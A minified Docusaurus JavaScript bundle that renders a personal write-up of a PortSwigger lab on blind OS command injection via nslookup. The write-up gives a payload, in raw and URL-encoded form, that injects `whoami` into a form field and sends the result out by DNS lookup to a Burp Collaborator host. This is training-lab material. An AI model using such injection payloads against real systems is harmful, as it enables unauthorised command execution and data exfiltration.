"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[4266],{3905:function(e,n,t){t.d(n,{Zo:function(){return p},kt:function(){return d}});var o=t(7294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);n&&(o=o.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,o)}return t}function a(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function c(e,n){if(null==e)return{};var t,o,r=function(e,n){if(null==e)return{};var t,o,r={},i=Object.keys(e);for(o=0;o<i.length;o++)t=i[o],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(o=0;o<i.length;o++)t=i[o],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var s=o.createContext({}),l=function(e){var n=o.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):a(a({},n),e)),t},p=function(e){var n=l(e.components);return o.createElement(s.Provider,{value:n},e.children)},u={inlineCode:"code",wrapper:function(e){var n=e.children;return o.createElement(o.Fragment,{},n)}},m=o.forwardRef((function(e,n){var t=e.components,r=e.mdxType,i=e.originalType,s=e.parentName,p=c(e,["components","mdxType","originalType","parentName"]),m=l(t),d=r,b=m["".concat(s,".").concat(d)]||m[d]||u[d]||i;return t?o.createElement(b,a(a({ref:n},p),{},{components:t})):o.createElement(b,a({ref:n},p))}));function d(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var i=t.length,a=new Array(i);a[0]=m;var c={};for(var s in n)hasOwnProperty.call(n,s)&&(c[s]=n[s]);c.originalType=e,c.mdxType="string"==typeof e?e:r,a[1]=c;for(var l=2;l<i;l++)a[l]=t[l];return o.createElement.apply(null,a)}return o.createElement.apply(null,t)}m.displayName="MDXCreateElement"},2327:function(e,n,t){t.r(n),t.d(n,{frontMatter:function(){return c},contentTitle:function(){return s},metadata:function(){return l},toc:function(){return p},default:function(){return m}});var o=t(7462),r=t(3366),i=(t(7294),t(3905)),a=["components"],c={tags:["nslookup","commmand injection"],image:"img/Portswigger/command-injection.png"},s=void 0,l={unversionedId:"portswigger/Command-Injection/Lab-5 nslookup with command injection",id:"portswigger/Command-Injection/Lab-5 nslookup with command injection",title:"Lab-5 nslookup with command injection",description:"--\x3e This lab is same as Lab-4 but here we have to execute the os command in the DNS lookup which we can do with the backtick so i set up my burp collaborator server and used this payload in every field :",source:"@site/docs/portswigger/Command-Injection/Lab-5 nslookup with command injection.md",sourceDirName:"portswigger/Command-Injection",slug:"/portswigger/Command-Injection/Lab-5 nslookup with command injection",permalink:"/Cybernotes/docs/portswigger/Command-Injection/Lab-5 nslookup with command injection",tags:[{label:"nslookup",permalink:"/Cybernotes/docs/tags/nslookup"},{label:"commmand injection",permalink:"/Cybernotes/docs/tags/commmand-injection"}],version:"current",frontMatter:{tags:["nslookup","commmand injection"],image:"img/Portswigger/command-injection.png"},sidebar:"tutorialSidebar",previous:{title:"Lab-4 OAST with nslookup",permalink:"/Cybernotes/docs/portswigger/Command-Injection/Lab-4 OAST with nslookup"},next:{title:"Lab-1",permalink:"/Cybernotes/docs/portswigger/Directory-traversal/Lab-1"}},p=[],u={toc:p};function m(e){var n=e.components,c=(0,r.Z)(e,a);return(0,i.kt)("wrapper",(0,o.Z)({},u,c,{components:n,mdxType:"MDXLayout"}),(0,i.kt)("p",null,"--\x3e This lab is same as Lab-4 but here we have to execute the os command in the DNS lookup which we can do with the backtick so i set up my burp collaborator server and used this payload in every field :"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"}," & nslookup `whoami`.server.burpcollaborator.net &\n#After encoding\n+%26+nslookup+`whoami`.hm79ndstkro1octlc11atpw9w02qqf.burpcollaborator.net+%26\n")),(0,i.kt)("p",null,"--\x3e And after using it in ",(0,i.kt)("inlineCode",{parentName:"p"},"email")," field i got the DNS lookup with the username!"),(0,i.kt)("p",null,(0,i.kt)("img",{src:t(5746).Z,width:"1855",height:"773"})),(0,i.kt)("p",null,"--\x3e And we solved the lab!"),(0,i.kt)("p",null,(0,i.kt)("img",{src:t(1838).Z,width:"1569",height:"561"})))}m.isMDXComponent=!0},5746:function(e,n,t){n.Z=t.p+"assets/images/Pastedimage20220120125310-f45a28047d47b7b506089322bdb289ea.png"},1838:function(e,n,t){n.Z=t.p+"assets/images/Pastedimage20220120125352-a801386b5307bc65dfbb8e5630e9510f.png"}}]);